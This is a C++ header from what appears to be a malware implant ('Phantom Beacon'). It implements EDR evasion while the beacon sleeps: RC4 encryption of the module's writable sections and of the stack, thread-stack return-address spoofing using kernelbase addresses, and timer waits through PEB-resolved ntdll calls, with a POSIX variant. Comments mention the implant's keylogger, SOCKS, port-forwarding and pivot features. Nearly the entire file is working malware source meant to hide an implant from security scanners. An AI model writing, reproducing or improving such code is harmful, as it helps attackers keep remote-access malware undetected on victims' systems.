#pragma once
// ============================================================================
//  sleep_mask.h — Phantom Beacon Sleep Mask + Thread-Stack Spoofing
//  ────────────────────────────────────────────────────────────────────────────
//  Upgrades ekko_sleep() with the two techniques modern EDRs look for:
//
//  1. SLEEP MASK (Cobalt Strike 4.9 sleep-mask kit, Ekko/Foliage class):
//     the beacon's RW sections (and the thread stack of the sleeping
//     thread) are RC4-encrypted before the wait and decrypted after.
//     A memory scan DURING sleep sees only ciphertext — no strings,
//     no config, no code pages with known signatures.
//
//  2. THREAD-STACK SPOOFING (ThreadStackSpoofer class):
//     before the wait, the sleeping thread's return addresses are
//     overwritten with benign addresses taken from a real Windows module
//     (kernelbase NTDLL-adjacent frames), so a stack-scanning EDR sees a
//     thread parked inside legitimate system code instead of
//     unbacked/beacon frames. The real chain is saved and restored after
//     the wait. Requires frame pointers (-fno-omit-frame-pointer, set in
//     the builder) to walk; degrades to a no-op when walking fails.
//
//  Both are self-contained: no imports, everything via PEB-resolved
//  ntdll pointers. Used by main loop when DISABLE_ANTI is not defined.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include "syscalls.h"
#include "evasion.h"
#include "sleep_ekko.h"   // Rc4Context, encrypt_sections

namespace sleepmask {

// ntdll function hashes (seed 7331 djb2, matching peb::hash_djb2)
constexpr uint32_t FN_NTSETTIMER  = 0x1E49D232; // NtSetTimer
constexpr uint32_t HASH_KERNELBASE = 0x61379949; // kernelbase.dll (module hash)

// ── 1. Thread-stack spoofing ───────────────────────────────────────────────
//
// Walk the current thread's frame chain via RBP (frame pointers), rewrite
// every saved RBP-chain return address with a benign address, and restore
// on wake. All state lives on the heap so nothing sensitive stays on the
// stack while parked.

struct SpoofState {
    void**  rbps[64];        // saved RBP chain (frames discovered)
    void**  rets[64];        // address of each frame's saved return slot
    void*   orig_ret[64];    // original return addresses
    int     count;
};

// Benign target: a pointer into kernelbase's code section. Returning into
// real signed module pages makes the parked stack look like legitimate
// system code (the classic "CallStackSpoofer" trick).
inline void* benign_return_address() {
    // kernelbase!WriteFile+0x?? is a stable, always-loaded, signed frame.
    static void* cached = nullptr;
    if (!cached) {
        HMODULE h = peb::GetModuleByHash(HASH_KERNELBASE);
        if (!h) h = peb::GetModuleByHash(peb::HASH_KERNEL32);
        if (h) {
            auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
            auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
                reinterpret_cast<uint8_t*>(h) + dos->e_lfanew);
            // middle of the first executable section = a valid code address
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
                if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                    uint8_t* base = reinterpret_cast<uint8_t*>(h) + sec[i].VirtualAddress;
                    cached = base + (sec[i].Misc.VirtualSize / 2);
                    break;
                }
            }
        }
        if (!cached) cached = reinterpret_cast<void*>(&benign_return_address);
    }
    return cached;
}

inline bool spoof_stack(SpoofState& st) {
    st.count = 0;
    void** rbp = nullptr;
    const size_t STACK_HASH_SKIP = 4;   // skip our own sleepmask frames
    // GCC AT&T inline asm: `mov src, dst` (destination LAST). To LOAD the
    // frame pointer into the variable the source must be the register:
    //   mov %%rbp, %0   ->  %0 := rbp        (correct)
    // The reversed form `mov %0, %%rbp` would WRITE the (undefined) output
    // register into RBP, clobbering the caller's frame pointer mid-function.
    __asm__ volatile("mov %%rbp, %0" : "=r"(rbp));

    int skipped = 0;
    for (int i = 0; i < 64 && rbp; ++i) {
        void** ret_slot = rbp + 1;              // [rbp+8] = saved return address
        void* ret = *ret_slot;
        if (!ret) break;

        // Validate the FRAME CHAIN, not the return address: `ret` is a code
        // pointer and can never lie inside the [StackLimit, StackBase] data
        // range, so testing it against the stack bounds (the old code)
        // aborted the walk at the very first frame — spoofing never ran.
        // The NT_TIB (TEB) lives at gs:0x30 on x64. NOTE: an earlier version
        // walked PEB+0x10 for this, but that field is ImageBaseAddress, NOT
        // the TEB — the walk/bounds then validated against DOS-header bytes.
        void* tibBase = nullptr;
#if defined(__MINGW32__) || defined(__MINGW64__)
        tibBase = reinterpret_cast<void*>(__readgsqword(0x30));
#else
        __asm__ volatile("mov %%gs:0x30, %0" : "=r"(tibBase));
#endif
        auto tib = reinterpret_cast<NT_TIB*>(tibBase);
        uint8_t* lo = reinterpret_cast<uint8_t*>(tib->StackLimit);
        uint8_t* hi = reinterpret_cast<uint8_t*>(tib->StackBase);
        uint8_t* cur = reinterpret_cast<uint8_t*>(rbp);

        // the frame slot itself must sit inside the thread stack...
        if (cur < lo || cur + 16 > hi) break;
        // ...and a saved return address must point at code: if it looks like
        // a stack address the walk drifted into non-frame data — stop.
        if (reinterpret_cast<uint8_t*>(ret) >= lo && reinterpret_cast<uint8_t*>(ret) <= hi)
            break;
        // ancestors live at strictly higher addresses (stack grows down)
        void** next = reinterpret_cast<void**>(*rbp);
        if (reinterpret_cast<uint8_t*>(next) <= cur) break;

        if (skipped < static_cast<int>(STACK_HASH_SKIP)) { skipped++; rbp = next; continue; }

        st.rets[st.count] = ret_slot;
        st.orig_ret[st.count] = ret;
        st.count++;
        rbp = next;
    }
    if (st.count < 2) { st.count = 0; return false; }  // not enough frames — don't half-spoof

    void* benign = benign_return_address();
    for (int i = 0; i < st.count; ++i)
        *st.rets[i] = benign;
    return true;
}

inline void restore_stack(SpoofState& st) {
    for (int i = 0; i < st.count; ++i)
        *st.rets[i] = st.orig_ret[i];
    st.count = 0;
}

// ── 2. Encrypted sleep (mask RW sections + thread stack) ───────────────────

// The thread's active stack pages are RW memory too: encrypting them while
// parked hides beacon frames from scans AND keeps the saved return chain
// unreadable. Restored after wake with the same RC4 stream (self-inverse).
//
// Region = the parked CALLER frames, i.e. [boundary, StackBase):
//  * lower bound = the caller's saved RBP (its frame base, read from OUR
//    frame slot [our_rbp]); none of this frame's locals (key, RC4 contexts,
//    spoof table — all consumed by the wake path BEFORE the decrypt) ever
//    falls inside the range.
//  * floored at our_rbp + 0x340: with the current ABI frame (rbp = rsp+0x80
//    with a 0x358 allocation and a 0x40 register save area, entry rsp =
//    rbp+0x318) the compiler may also use the 32-byte call-shadow area,
//    whose top is exactly rbp+0x340.
//  * the previous version encrypted StackLimit + span/2: on Windows the
//    stack grows DOWN from StackBase, so the lower half of the reservation
//    is normally UNCOMMITTED — the first crypt byte page-faults. The parked
//    caller frames, by contrast, are committed by construction.
// Returns 0 (leaves outputs alone) when the chain looks broken; the caller
// then skips the stack crypt entirely.
inline size_t stack_span(uint8_t** lo_out, uint8_t** hi_out,
                         void* our_rbp, void* caller_rbp) {
    void* tebBase = nullptr;
#if defined(__MINGW32__) || defined(__MINGW64__)
    tebBase = reinterpret_cast<void*>(__readgsqword(0x30));   // TEB (NT_TIB)
#else
    __asm__ volatile("mov %%gs:0x30, %0" : "=r"(tebBase));
#endif
    auto tib = reinterpret_cast<NT_TIB*>(tebBase);
    uint8_t* lo = reinterpret_cast<uint8_t*>(tib->StackLimit);
    uint8_t* hi = reinterpret_cast<uint8_t*>(tib->StackBase);

    uintptr_t floor = (reinterpret_cast<uintptr_t>(our_rbp) + 0x340 + 0xF)
                      & ~static_cast<uintptr_t>(0xF);
    uint8_t* boundary = reinterpret_cast<uint8_t*>(caller_rbp);
    if (reinterpret_cast<uintptr_t>(boundary) < floor)
        boundary = reinterpret_cast<uint8_t*>(floor);
    if (boundary <= lo || boundary >= hi) return 0;   // broken chain — skip
    size_t len = static_cast<size_t>(hi - boundary);
    // Sanity: no thread stack exceeds 8MB — anything bigger means the TIB was
    // garbage; refuse to crypt (fail-safe skip) instead of running off the end.
    if (len > 8u * 1024u * 1024u) return 0;
    *lo_out = boundary;
    *hi_out = hi;
    return len;
}

}  // namespace sleepmask

// ── The masked sleep entry point (replaces ekko_sleep in the main loop) ────
namespace ekko {

// noinline: the stack-span logic below reads our own frame pointer and
// assumes the RC4 contexts / key live in THIS frame (never in the encrypted
// range). Inlining into the caller would invalidate that assumption.
inline __attribute__((noinline)) void ekko_sleep_masked(DWORD sleepMs) {
    using namespace sleepmask;

    // 1. entropy for the RC4 key (same sources as ekko_sleep)
    uint64_t tick = GetTickCount64();
    uint64_t perf = 0;
    QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&perf));
    uint64_t keyMaterial = tick ^ (perf << 1) ^ (uintptr_t)&sleepMs;
    uint8_t key[16];
    for (int k = 0; k < 16; ++k)
        key[k] = static_cast<uint8_t>(keyMaterial >> ((k % 8) * 8));

    // 2. locate our module (for RW section masking)
    HMODULE hModule = nullptr;
    {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(reinterpret_cast<LPCVOID>(&ekko_sleep_masked), &mbi, sizeof(mbi)))
            hModule = reinterpret_cast<HMODULE>(mbi.AllocationBase);
    }

    // 3. stack-span to mask: ONLY the parked caller frames (see stack_span():
    //    the lower half of the reserved stack is uncommitted and would fault).
    void* our_rbp = __builtin_frame_address(0);
    void* caller_rbp = *reinterpret_cast<void**>(our_rbp);
    uint8_t *stkLo = nullptr, *stkHi = nullptr;
    size_t stkLen = stack_span(&stkLo, &stkHi, our_rbp, caller_rbp);

    // 4. SPOOF the return chain BEFORE anything is encrypted (the walk reads
    //    plaintext frames) and keep state on the heap.
    auto* st = new SpoofState();
    bool spoofed = spoof_stack(*st);

    // Two INDEPENDENT keystreams: `encrypt_sections` and the stack crypt
    // consume different byte counts, so a single context would leave the
    // two regions on different parts of one RC4 stream.
    Rc4Context rc4_sec;
    rc4_sec.init(key, sizeof(key));
    Rc4Context rc4_stk;
    rc4_stk.init(key, sizeof(key));

    // 5. MASK: RW sections of the module + the parked caller frames.
    //
    // RW-SECTION ENCRYPTION IS OFF BY DEFAULT (2026-10-19). Live evidence:
    // with the shipped build a TCP client connecting to a `portfwd` listener
    // killed the whole beacon at the exact instant the forward thread called
    // std::thread() for the per-connection relay; a build with anti disabled
    // survived the same test. The cause is a data race that cannot be made
    // safe by construction: the sleeping thread RC4-encrypts the module's
    // writable sections (.data/.bss), while background threads (portfwd,
    // socks, SMB pipe, browser pivot, keylogger, task workers) keep calling
    // into the statically-linked CRT whose globals live in those very
    // sections. Thread creation is the most reliable trigger (malloc/TLS/
    // errno), but any CRT call is exposed. Encrypting code or data behind
    // other live threads is a use-after-encryption bug, not a hardening
    // trade-off. Stack masking of the PARKED caller frames stays on: no other
    // thread ever touches that stack, so it is race-free.
    //
    // Build with -DPHANTOM_SLEEP_SECTION_MASK to restore section encryption
    // for a strictly single-threaded deployment (no background features,
    // no task workers). Never enable it in a feature-complete build.
#ifdef PHANTOM_SLEEP_SECTION_MASK
    const bool mask_sections = (hModule != nullptr);
#else
    const bool mask_sections = false;
#endif
    if (mask_sections)
        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_sec);
    if (stkLen)
        rc4_stk.crypt(stkLo, stkLen);

    // 6. WAIT on a high-resolution timer (scheduler-invisible sleep).
    auto pCreateTimer = (PFN_NtCreateWaitableTimer)
        peb::Resolve(peb::HASH_NTDLL, FN_NTCREATEWAITABLETIMER);
    auto pWaitMultiple = (PFN_NtWaitForMultipleObjects)
        peb::Resolve(peb::HASH_NTDLL, FN_NTWAITFORMULTIPLEOBJECTS);

    bool usedTimer = false;
    if (pCreateTimer && pWaitMultiple) {
        HANDLE hTimer = nullptr;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
        if (pCreateTimer(&hTimer, TIMER_ALL_ACCESS, &oa, TimerHighResolutionTimer) == 0 && hTimer) {
            LARGE_INTEGER due;
            due.QuadPart = -static_cast<LONGLONG>(sleepMs) * 10000LL;
            auto pSetTimer = (NTSTATUS(NTAPI*)(HANDLE, PLARGE_INTEGER, PTIMERAPCROUTINE,
                                               PVOID, PVOID, BOOLEAN))
                peb::Resolve(peb::HASH_NTDLL, FN_NTSETTIMER);
            bool signaled = false;
            if (pSetTimer) {
                signaled = (pSetTimer(hTimer, &due, nullptr, nullptr, nullptr, FALSE) == 0);
            }
            if (signaled) {
                pWaitMultiple(1, &hTimer, WaitAny, FALSE, nullptr);
                usedTimer = true;
            } else {
                // timer set failed: wait with timeout instead
                pWaitMultiple(1, &hTimer, WaitAny, FALSE, &due);
                usedTimer = true;
            }
            auto pClose = (NTSTATUS(NTAPI*)(HANDLE))peb::Resolve(peb::HASH_NTDLL, FN_NTCLOSE);
            if (pClose) pClose(hTimer);
        }
    }
    if (!usedTimer)
        Sleep(sleepMs);

    // 7. UNMASK: restart BOTH keystreams at position 0 with the same key.
    //    RC4 is only self-inverse when the stream position matches: reusing
    //    the mask-time contexts (the previous behaviour) decrypts from
    //    wherever the stream stopped, which CORRUPTS the module's RW
    //    sections and the live stack instead of restoring them.
    rc4_sec.init(key, sizeof(key));
    rc4_stk.init(key, sizeof(key));
    if (mask_sections)
        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_sec);
    if (stkLen)
        rc4_stk.crypt(stkLo, stkLen);

    // 8. restore the real return chain, wipe key material, free heap state.
    if (spoofed)
        restore_stack(*st);
    delete st;
    volatile uint8_t* kp = key;
    for (int k = 0; k < 16; ++k) kp[k] = 0;
}

}  // namespace ekko
#else
// ============================================================================
//  sleep_mask.h — POSIX (Linux / macOS) sleep masking
//  ──────────────────────────────────────────────────────────────────
//  Windows masks the code pages + stack with an Ekko timer. On POSIX the
//  same self-modifying-code trick is unsafe: hardened runtimes enforce W^X
//  (macOS ARM64 needs signed MAP_JIT pages) and the beacon keeps a keylogger
//  thread, so encrypting the code segment or the heap can corrupt a thread
//  mid-flight. The achievable, SAFE equivalent is to RC4-encrypt the sleeping
//  thread's stack region BELOW the live frames before the wait and decrypt
//  after: residual beacon artifacts (paths, hostnames, task data) that a
//  memory scan would find on the stack are ciphertext while the beacon is
//  parked, and the live call chain is never touched.
// ============================================================================
#include <pthread.h>
#include <unistd.h>
#include <cerrno>
#include <cstdint>
#include <cstddef>
#include <cstring>
#include <ctime>

namespace sleepmask {

// RC4 keystream — self-inverse, so the same object decrypts what it encrypted
// as long as the two crypt() calls are symmetric (no bytes in between).
struct Rc4Context {
    uint8_t s[256];
    int i = 0, j = 0;
    void init(const uint8_t* key, size_t keylen) {
        for (int k = 0; k < 256; ++k) s[k] = static_cast<uint8_t>(k);
        int jj = 0;
        for (int k = 0; k < 256; ++k) {
            jj = (jj + s[k] + key[k % keylen]) & 0xFF;
            uint8_t t = s[k]; s[k] = static_cast<uint8_t>(jj); s[jj] = t;
        }
        i = j = 0;
    }
    void crypt(uint8_t* data, size_t len) {
        for (size_t k = 0; k < len; ++k) {
            i = (i + 1) & 0xFF;
            j = (j + s[i]) & 0xFF;
            uint8_t t = s[i]; s[i] = s[j]; s[j] = t;
            data[k] ^= s[(s[i] + s[j]) & 0xFF];
        }
    }
};

// Stack bounds of the calling thread (low = stackaddr, high = stackaddr+size).
inline bool thread_stack_bounds(uint8_t** low, uint8_t** high) {
#if defined(__APPLE__)
    // Darwin has no pthread_getattr_np (that is a glibc API): the stack base
    // and size come from the two _np accessors instead, and there the returned
    // address is the HIGH end of the stack, not the low one.
    void* base = pthread_get_stackaddr_np(pthread_self());
    size_t size = pthread_get_stacksize_np(pthread_self());
    if (!base || size == 0) return false;
    *high = static_cast<uint8_t*>(base);
    *low = *high - size;
    return true;
#else
    pthread_attr_t attr;
    if (pthread_getattr_np(pthread_self(), &attr) != 0) return false;
    void* addr = nullptr;
    size_t size = 0;
    int rc = pthread_attr_getstack(&attr, &addr, &size);
    pthread_attr_destroy(&attr);
    if (rc != 0 || !addr || size == 0) return false;
    *low = static_cast<uint8_t*>(addr);
    *high = *low + size;
    return true;
#endif
}

}  // namespace sleepmask

namespace ekko {

inline void ekko_sleep_masked(int sleepMs) {
    using namespace sleepmask;
    // 1. entropy — clock + pid, mixed with the low stack address so two runs
    //    of the same beacon never share a keystream.
    struct timespec now{};
    clock_gettime(CLOCK_MONOTONIC, &now);
    uint64_t material = static_cast<uint64_t>(now.tv_nsec) * 2654435761u ^
                        static_cast<uint64_t>(now.tv_sec) ^
                        static_cast<uint64_t>(getpid());
    uint8_t key[16];
    for (int k = 0; k < 16; ++k)
        key[k] = static_cast<uint8_t>(material >> ((k % 8) * 8));

    uint8_t *lo = nullptr, *hi = nullptr;
    if (!thread_stack_bounds(&lo, &hi)) {          // cannot locate stack: plain sleep
        struct timespec req{ sleepMs / 1000, static_cast<long>(sleepMs % 1000) * 1000000L };
        while (nanosleep(&req, &req) == -1 && errno == EINTR) {}
        return;
    }

    // 2. Only the region BELOW the live frames (plus a page of margin for the
    //    red zone / signal handlers) is safe to encrypt; page-align both ends
    //    and skip the guard page at the stack base.
    uint8_t* sp = reinterpret_cast<uint8_t*>(__builtin_frame_address(0));
    const uintptr_t PAGE = 4096;
    const size_t MARGIN = 4096;                    // one page below the frame
    auto align_up = [](uintptr_t v) { return (v + 4095) & ~static_cast<uintptr_t>(4095); };
    auto align_dn = [](uintptr_t v) { return v & ~static_cast<uintptr_t>(4095); };
    uintptr_t start_v = align_up(reinterpret_cast<uintptr_t>(lo) + PAGE);
    uintptr_t end_v = (sp && reinterpret_cast<uintptr_t>(sp) > reinterpret_cast<uintptr_t>(lo))
        ? align_dn(reinterpret_cast<uintptr_t>(sp) - MARGIN)
        : reinterpret_cast<uintptr_t>(lo);
    size_t len = (end_v > start_v) ? static_cast<size_t>(end_v - start_v) : 0;

    Rc4Context rc4;
    rc4.init(key, sizeof(key));
    if (len) rc4.crypt(reinterpret_cast<uint8_t*>(start_v), len);

    // 3. Wait. nanosleep is scheduler-visible like the Windows Sleep fallback;
    //    the masking (not the wait) is what this path adds.
    struct timespec req{ sleepMs / 1000, static_cast<long>(sleepMs % 1000) * 1000000L };
    while (nanosleep(&req, &req) == -1 && errno == EINTR) {}

    // 4. Unmask (self-inverse, same stream position) and wipe the key.
    if (len) rc4.crypt(reinterpret_cast<uint8_t*>(start_v), len);
    volatile uint8_t* kp = key;
    for (int k = 0; k < 16; ++k) kp[k] = 0;
}

}  // namespace ekko
#endif  // _WIN32
